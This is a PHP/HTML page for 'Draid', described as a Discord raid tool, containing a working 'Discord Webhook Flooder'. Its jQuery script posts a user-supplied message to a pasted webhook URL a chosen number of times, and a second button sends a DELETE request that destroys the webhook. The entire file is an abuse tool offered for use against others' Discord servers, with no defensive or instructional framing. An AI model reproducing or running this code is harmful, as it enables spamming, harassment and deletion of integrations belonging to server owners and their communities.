<?php
?>

<!DOCTYPE HTML>

<head>
	<title>Draid</title>
	<meta charset="UTF-8">
	<meta name="description" content="Discord raid tool.">
	<meta name="author" content="Jhin Scripter">
	<link rel="icon" href="resources/icone.png">
    <link href="https://fonts.googleapis.com/css?family=Righteous" rel="stylesheet">
    <script defer src="https://use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
</head>

<style>
body {
  background-image: url("../resources/anotherbg.gif");
  background-repeat: no-repeat;
  background-size: cover;
}
textarea {
  resize: none;
}
.doitlol {
	box-shadow:inset 8px -8px 19px 2px #756308;
	background:linear-gradient(to bottom, #ffea00 5%, #fff700 100%);
	background-color:#ffea00;
	border-radius:14px;
	border:1px solid #f7ff00;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Verdana;
	font-size:28px;
	font-weight:bold;
	padding:22px 62px;
	text-decoration:none;
	text-shadow:3px 2px 7px #3d768a;
}
.doitlol:hover {
	background:linear-gradient(to bottom, #fff700 5%, #ffea00 100%);
	background-color:#fff700;
}
.doitlol:active {
	position:relative;
	top:1px;
}
.themenubutton {
	box-shadow:inset 0px 34px 0px -15px #b54b3a;
	background-color:#a73f2d;
	border:1px solid #241d13;
	display:inline-block;
	cursor:pointer;
	color:#ffffff;
	font-family:Arial;
	font-size:15px;
	font-weight:bold;
	position: absolute;
	top: 10px;
	right: 10px;
	padding:9px 23px;
	text-decoration:none;
	text-shadow:0px -1px 0px #7a2a1d;
}
.themenubutton:hover {
	background-color:#b34332;
}
.themenubutton:active {
	position: absolute;
	top: 10px;
	right: 10px;
}
</style>

<script>
var cur = 0;
$(document).ready(function() {
  function send_msg() {
    var m2s = document.getElementById("themsg").value;

    function update_status() {
    	document.getElementById("thestatuslol").innerHTML = `FLOODING ${cur} TIMES`;
    }

    posto = $.ajax({
      url: document.getElementById("list").value,
      type: "post",
      data: JSON.stringify({"content": m2s, "username": "Draid", "avatar_url": "https://i.imgur.com/lB1VD8q.png"}),
      headers: {
          "Content-type": "application/json"
      },
    });
    posto.done(function(response, status, a) {
    	cur++;
    	update_status()
      //console.log("Output: " + response)
    });
  }
  $('#dawae').click(function() {
  	var cur = 0
		var number_of_messages = document.getElementById("quantiademsg").value;
		Array.from({length: number_of_messages}, () => send_msg());
	})
	$('#dekrk').click(function() {
  	$.ajax({
      url: document.getElementById("list").value,
      type: "delete",
      success: function(data) {
      	document.getElementById("thestatuslol").innerHTML = `WEBHOOK DELETED!`;
      	//console.log("Output: " + response)
      },
    });
	})
})
</script>

<script>
	function gotomenu() {
		window.location.replace("../main.php")
	}
</script>

<body>

	<center>
		<h1 style="color: lime; font-size: 100px;">Discord Webhook Flooder</h1>
		<textarea id="list" name="list" rows="1" required="" cols="100" style="max-width: 100rem; background-color: black; color: lime; font-size: 15px;" class="form-control" placeholder="https://discordapp.com/api/webhooks/[XXX]"></textarea><br><textarea id="themsg" name="themsg" rows="10" required="" cols="100" style="max-width: 100rem; background-color: black; color: lime; font-size: 15px;" class="form-control" placeholder="MESSAGE"></textarea><br><textarea id="quantiademsg" name="quantiademsg" rows="1" required="" cols="100" style="max-width: 100rem; background-color: black; color: lime; font-size: 15px;" class="form-control" maxlength="3" placeholder="NUMBER OF TIMES"></textarea><br><br><br>
		<button type="submit" id="dawae" class="doitlol" >FLOOD</button>&nbsp;&nbsp;&nbsp;<button type="submit" id="dekrk" class="doitlol" >DELETE WEBHOOK</button><br><br>
		<h1 style="color: cyan; font-size: 35px;" id="thestatuslol">AFK</h1>
	</center>

	<button type="submit" id="dawae" class="themenubutton" onclick="gotomenu()">Menu</button><br><br>

	<center>
		
	</center>

</body>